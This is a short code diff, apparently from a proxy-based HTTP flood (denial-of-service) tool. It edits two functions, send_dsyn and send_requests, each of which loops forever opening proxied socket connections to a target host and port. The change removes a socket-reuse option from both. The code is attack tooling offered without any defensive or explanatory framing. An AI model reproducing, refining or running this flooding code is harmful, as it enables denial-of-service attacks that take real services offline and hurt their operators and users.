@@ -349,7 +349,6 @@ def send_dsyn():
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
@@ -386,7 +385,6 @@ def send_requests(): #傳統HTTP FLOOD
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
